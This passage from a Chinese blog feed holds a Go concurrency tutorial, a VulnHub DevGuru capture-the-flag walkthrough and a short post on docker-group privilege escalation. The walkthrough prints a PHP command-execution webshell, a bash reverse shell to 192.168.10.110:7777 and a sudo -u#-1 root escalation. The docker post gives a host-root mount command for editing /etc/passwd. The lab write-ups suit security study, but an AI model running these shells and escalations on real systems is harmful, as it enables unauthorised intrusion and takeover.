class="token operator">&lt;-</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">defer</span> wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> a <span class="token operator">:=</span> <span class="token keyword">range</span> ch <span class="token punctuation">{</span>        resp<span class="token punctuation">,</span> er <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>        <span class="token keyword">if</span> er <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s 请求失败\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//defer resp.Body.Close()</span>        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>StatusCode <span class="token operator">==</span> <span class="token number">200</span> <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">"200 ok"</span><span class="token punctuation">)</span>            final <span class="token operator">&lt;-</span> a        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">result</span><span class="token punctuation">(</span>ch <span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">defer</span> wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    file<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"./final.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_TRUNC<span class="token operator">|</span>os<span class="token punctuation">.</span>O_CREATE<span class="token operator">|</span>os<span class="token punctuation">.</span>O_WRONLY<span class="token operator">|</span>os<span class="token punctuation">.</span>O_APPEND<span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> a <span class="token operator">:=</span> <span class="token keyword">range</span> ch <span class="token punctuation">{</span>        s <span class="token operator">:=</span> a <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token string">"\n"</span>        file<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">read</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">,</span> ch <span class="token keyword">chan</span><span class="token operator">&lt;-</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">defer</span> wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    file<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"./domain.txt"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"error,请检查错误"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        str<span class="token punctuation">,</span> <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token builtin">string</span> <span class="token operator">:=</span> <span class="token function">string</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>        a <span class="token operator">:=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> <span class="token builtin">string</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> s        a <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">Replace</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        ch <span class="token operator">&lt;-</span> a    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> s <span class="token builtin">string</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"请输入域名:"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Scanln</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span>    ch <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    final <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">go</span> <span class="token function">read</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">go</span> <span class="token function">request</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span> final<span class="token punctuation">)</span>        wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">go</span> <span class="token function">result</span><span class="token punctuation">(</span>final<span class="token punctuation">)</span>    wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h3 id="channel中的select"><a href="#channel中的select" class="headerlink" title="channel中的select"></a>channel中的select</h3><p>具体的语句为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">select</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> 执行语句<span class="token punctuation">:</span>    <span class="token keyword">case</span> 执行语句<span class="token punctuation">:</span><span class="token punctuation">}</span></code></pre><p>例子为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">var</span> inc <span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    inc <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">var</span> num <span class="token builtin">int</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">select</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> num <span class="token operator">=</span> <span class="token operator">&lt;-</span>inc<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>从通道中读取值赋值给num            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>        <span class="token keyword">case</span> inc <span class="token operator">&lt;-</span> i<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>向通道中写入i这个变量        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>以上例子中两个case语句在每一次执行时会随机选择一个执行，若有一个无法执行就执行另一个，若都无法执行，则会执行default语句（这里我没有写），以上例子的结果是随机的，如果把通道的make大小改为1则结果为：0 2 4 6 8。</p><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h3><p>我们在进行异步操作时，对同一个数据会出现两个子线程同时修改的情况，这样就需要利用互斥锁来进行对数据的加锁以便实现操作</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"sync"</span><span class="token punctuation">)</span><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">var</span> wg sync<span class="token punctuation">.</span>WaitGroup<span class="token keyword">func</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">1</span>    <span class="token punctuation">}</span>    wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">go</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">go</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>在以上的例子中，会出最后得到的结果不为20000，出现这样的原因为我们开了两个线程来对x实习操作，有时候会出现两个同时对它进行操作，如果想要避免这种情况则需要在每个线程对x进行操作的时候加上互斥锁。</p><p>互斥锁的语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> lock sync<span class="token punctuation">.</span>Mutex  <span class="token comment" spellcheck="true">//定义一个全局的名为lock的互斥锁</span></code></pre><p>如果将其用在以上的例子中代码为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"sync"</span><span class="token punctuation">)</span><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">var</span> wg sync<span class="token punctuation">.</span>WaitGroup<span class="token keyword">func</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>       lock<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">1</span>       lock<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">go</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">go</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h3 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h3><p>上边的互斥锁对于单一操作来说能够保证数据的正确性，如果们在这其中再加入读的操作，如果一个数据发生变化，则所有的读操作都要等待操作完成，所以为了提高效率，就有了读写锁，及读写分离。</p><p>代码为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"sync"</span>    <span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">var</span> wg sync<span class="token punctuation">.</span>WaitGroup<span class="token keyword">var</span> rw sync<span class="token punctuation">.</span>RWMutex  <span class="token comment" spellcheck="true">//定义一个读写锁</span><span class="token comment" spellcheck="true">//读的函数</span><span class="token keyword">func</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">defer</span> wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    rw<span class="token punctuation">.</span><span class="token function">RLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//读锁</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    rw<span class="token punctuation">.</span><span class="token function">RUnlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//写的函数</span><span class="token keyword">func</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">defer</span> wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    rw<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//写锁</span>    x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">1</span>    rw<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">go</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//睡眠1秒为了方便等待写操作的完成，若不等待则最后的结果会有一定的随机性</span>    time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">go</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="sync补充"><a href="#sync补充" class="headerlink" title="sync补充"></a>sync补充</h2><h3 id="sync中的once"><a href="#sync中的once" class="headerlink" title="sync中的once"></a>sync中的once</h3><p>sync中的once表示某一操作只执行一次，once中含有一个结构体，结构体中含有锁和标志位，标志位表示此操作是否执行过，若为执行过则先改变标志位，在进行加锁然后执行后解锁。</p><p>执行代码为：</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//once传入的参数必须为没有参数和返回值的函数类型，所以有些时候需要用到闭包</span>once<span class="token punctuation">.</span><span class="token function">DO</span><span class="token punctuation">(</span>语句<span class="token punctuation">)</span></code></pre><h3 id="sync中的sync-Map"><a href="#sync中的sync-Map" class="headerlink" title="sync中的sync.Map"></a>sync中的sync.Map</h3><p>在上边我们学过map这一类型，如果我们i用goroutine对map进行多线程赋值，go语言一般来说最多只支持20个，如果想要赋值更多则会报错，在实际中如果想要对map进行多个赋值则需要利用sync.Map进行实现。例子为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"strconv"</span>    <span class="token string">"sync"</span><span class="token punctuation">)</span><span class="token keyword">var</span> wg sync<span class="token punctuation">.</span>WaitGroup<span class="token keyword">var</span> m sync<span class="token punctuation">.</span>Map<span class="token comment" spellcheck="true">//定义一个名为m的sync.map类型的变量</span><span class="token keyword">func</span> <span class="token function">m_ap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            key <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//利用sync.Map内置的函数对map进行键值对的赋值，且赋值只能用此函数</span>            m<span class="token punctuation">.</span><span class="token function">Store</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//利用sync.Map中的内置函数Load对map及进行取值，且取值只能用此函数</span>            value<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> m<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>            wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">m_ap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DevGuru</title>
      <link href="/2021/03/02/vulnhub-DevGuru/"/>
      <url>/2021/03/02/vulnhub-DevGuru/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场说明"><a href="#靶场说明" class="headerlink" title="靶场说明"></a>靶场说明</h1><p>此靶场对于有一定渗透经验的人来说算是一个比较简单的靶场,但对我来说简直了。</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>配置好靶场之后，先来扫一波端口，发现就开了22和80两个端口，端口方面没有什么提示就只能从80端口的web页面入手了，打开页面是个看起来很复杂的网页。<br><img src="/2021/03/02/vulnhub-DevGuru/1.png" alt></p><h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><p>对于web页面进行一波扫描发现了.git文件，这在CTF中算是一个比较有名的漏洞类型了，这类漏洞一般可以把网站文件泄露，这就给我们了一个渗透的突破点，<br><img src="/2021/03/02/vulnhub-DevGuru/2.png" alt><br>利用githack的python脚本直接梭哈了靶机的web文件，翻过之后我们找到了一个数据库的用户名和密码，<br><img src="/2021/03/02/vulnhub-DevGuru/3.png" alt><br>在administer.php处登录之后就可以访问数据库了，找到敏感信息<br><img src="/2021/03/02/vulnhub-DevGuru/4.png" alt><br>这里密码的加密方式为加盐之后的md5，所以我们在修改密码时也需要进行加盐，</p><pre><code>$2y$10$8IvBT8bcqlSBzwzETS3EE.0FCKfGUHmjKKRyd65v8AOob9ow5yKbG</code></pre><p>以上密码为对123456加盐之后的密文，将其与password和persist_code进行替换<br><img src="/2021/03/02/vulnhub-DevGuru/6.png" alt><br>此时我们想当与已经得到一个用户的用户名和密码所以我们需要再找一下登录页面，由于我的扫描字典有限，所以就嫖了别人的博客的到登录页面为</p><pre><code>http://192.168.10.9/backend/backend/auth/signin</code></pre><p><img src="/2021/03/02/vulnhub-DevGuru/7.png" alt></p><pre><code>用户名为：frank密码为：123456</code></pre><p>在登入之后，发现cms有点意思，能够命令执行<del>（这要是能交cnvd直接就高危了）</del>，<br><img src="/2021/03/02/vulnhub-DevGuru/8.png" alt><br>然后我们尝试修改源码（能够执行命令的那种），这里附上源码</p><pre><code>function onStart(){    $this-&gt;page[&quot;wdnmd&quot;] = system($_GET[&#39;cmd&#39;]);}</code></pre><p>再在markup中添加一下源码进行调用</p><pre><code>{{ this.page.wdnmd }}</code></pre><p>然后访问最开始的页面你会发现正常访问会访问不了，然后在URL上添加参数来执行命令，<br><img src="/2021/03/02/vulnhub-DevGuru/9.png" alt><br>然后将原本的命令改为能弹shell的那种<del>(能做坏事的那种)</del>，附上源码</p><pre><code>function onStart(){    $this-&gt;page[&quot;Harveysn0w&quot;] = system(&#39;bash -c \&#39;exec bash -i &amp;&gt;/dev/tcp/192.168.10.110/7777 &lt;&amp;1\&#39;&#39;);}</code></pre><p>监听端口，连接上了，很快啊，<br><img src="/2021/03/02/vulnhub-DevGuru/10.png" alt><br>到这里我们算是得到了第一个shell，然而这才是开始，我自己在这里实在没什么头绪就去借鉴了别人的博客<del>（读书人的话怎么能叫偷呢）</del>，发现在/var/backups文件夹里有一个app.ini.bak的文件，cat一波发现了其他用户的用户名和密码，<br><img src="/2021/03/02/vulnhub-DevGuru/11.png" alt><br>然后登入数据库，<br><img src="/2021/03/02/vulnhub-DevGuru/12.png" alt><br>再次找到frank用户<br><img src="/2021/03/02/vulnhub-DevGuru/13.png" alt><br>这次扔需要我们修改密码，但我在这里实在头大所以就直接放出123456加密后的密文了</p><pre><code>4f6289d97c8e4bb7d06390ee09320a272ae31b07363dbee078dea49e4881cdda50f886b52ed5a89578a0e42cca143775d8cb</code></pre><p>然后访问8585端口<del>（别问怎么知道的，问就是窃的）</del>，利用frank用户登入<br><img src="/2021/03/02/vulnhub-DevGuru/14.png" alt><br>然后会发现在<br><img src="/2021/03/02/vulnhub-DevGuru/15.png" alt><br>这里能够写shell，所以当然是弹一波shell了，附上源码</p><pre><code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.10.110/7777 &lt;&amp;1&#39;</code></pre><p>然后在再remade上边随便加点什么都可以保存之后访问remade就可谈shell了<br><img src="/2021/03/02/vulnhub-DevGuru/16.png" alt><br>然后，拿到shell的第一件事当然是查看权限了，<br><img src="/2021/03/02/vulnhub-DevGuru/17.png" alt><br>然后发现我们在这个文件下具有root的权限所以提权的点就在这里了，这里我在看过之后发现为一个2020年的有关sudo的cve，大概是利用参数的混合进行提权，算是一个比较经典的cve了，这里我就不多说了，所以直接上提权语句</p><pre><code>sudo -u#-1 sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code></pre><p><img src="/2021/03/02/vulnhub-DevGuru/18.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>普通的docker提权</title>
      <link href="/2020/12/19/%E6%99%AE%E9%80%9A%E7%9A%84docker%E6%8F%90%E6%9D%83/"/>
      <url>/2020/12/19/%E6%99%AE%E9%80%9A%E7%9A%84docker%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>简述一下docker和虚拟机的区别，docker利用的是你自己本身的PC的内核，而虚拟机则会完全虚拟出一个类真实环境，它会完全虚拟出一个PC该有内核，操作系统等，也就是说你的虚拟机如果没有第三方媒介的话，与你的PC可以说是两个独立的个体。而docker则是通过拉取镜像仓库的镜像来实现功能，docker会与你的本机有着一定程度上的联系，docker所利用的内核等完全是依赖你自己的本机，同时也不需要第三方媒介来实现与物理机的交互。</p><p>docker由它本身的特点能够实现虚拟机的一些功能，但又不会占用特别大的内存，有点类似Linux版的虚拟机，但由于它本身是从你PC的操作系统发展而来，自然会有一些和虚拟机不同的地方了</p><p>docker再创造的时候会生成一个docker组，同时也会在docker内部生成一个docker的管理员用户，一般默认都是root。docker也会有很多命令，其中-v 选项也就是–version会将我们PC上的文件映射到docker内部，这样就给了我们可以提权的点，我们可以从docker镜像仓库拉取一个镜像然后将本地的文件映射进入docker中，然后我们利用我们自己在docker内部root权限，将映射进来的/etc/passwd文件添加一个具有root权限的用户，于是有趣的就来了，我们的PC会同步生成一个同样的用户，然后su就完成了提权。</p><p>接下来附加docker提权的一个命令</p><pre class=" language-shell"><code class="language-shell">docker run -v /:/mnt  -it alpine </code></pre><p>此命令的解释为从奖项仓库拉取alpine镜像启动docker利用version选项（-v）将本地的/文件映射到mnt文件中，并以i和t为参数进入。这样我们就可以提权了</p><p><img src="/2020/12/19/%E6%99%AE%E9%80%9A%E7%9A%84docker%E6%8F%90%E6%9D%83/1.png" alt><br><img src="/2020/12/19/%E6%99%AE%E9%80%9A%E7%9A%84docker%E6%8F%90%E6%9D%83/2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-chili</title>
      <link href="/2020/11/30/vulnhub-chili/"/>
      <url>/2020/11/30/vulnhub-chili/</url>
      
